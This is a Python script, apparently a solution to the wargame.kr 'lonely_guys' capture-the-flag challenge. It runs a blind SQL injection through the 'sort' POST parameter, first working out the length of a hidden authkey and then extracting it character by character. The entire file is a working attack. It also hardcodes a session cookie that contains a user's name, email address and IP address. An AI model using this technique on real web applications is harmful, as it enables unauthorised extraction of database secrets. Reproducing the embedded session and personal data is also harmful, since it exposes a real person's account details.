import requests

url = 'http://wargame.kr:8080/lonely_guys/index.php'
cookies={'ci_session':'a%3A10%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22cf14ee8a0ef1c46dd6ff54b2977757de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22222.110.147.52%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.121+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1553245770%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22name%22%3Bs%3A7%3A%22noonzib%22%3Bs%3A5%3A%22email%22%3Bs%3A19%3A%22noonzib14%40gmail.com%22%3Bs%3A4%3A%22lang%22%3Bs%3A3%3A%22kor%22%3Bs%3A11%3A%22achievement%22%3Bs%3A7%3A%22default%22%3Bs%3A5%3A%22point%22%3Bs%3A4%3A%224266%22%3B%7D56c38ed12c4edd2ea20e033d482a93b07a493dfe'}
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
flag=""
length = 1
while True:
    data = {'sort': ",(select 1 from guys_tbl,authkey where 1=1 and (length(authkey)="+str(length)+"))"}
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    status_code = response.status_code
    html_data = response.text
    print ",(select 1 from guys_tbl,authkey where 1=1 and (length(authkey)="+str(length)+"))"
    if (html_data.find("jacob") == -1):
        print "[+]Find : " + str(length)
        break
    length += 1
print "[*]End"
print "[+]length is " + str(length)

for i in range(length+1):
    for j in range(33,123):
        data = {'sort': ",(select 1 from guys_tbl,authkey where 1=1 and (ord(substr(authkey,"+str(i)+",1))="+str(j)+"))"}
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        status_code = response.status_code
        html_data = response.text
        print ",(select 1 from guys_tbl,authkey where 1=1 and (ord(substr(authkey,"+str(i)+",1))="+str(j)+"))"
        if (html_data.find("jacob") == -1):
            flag += chr(j)
            print "[+]Find : " + flag
            break
    print "[*]End"
    print "[+]flag is " + flag

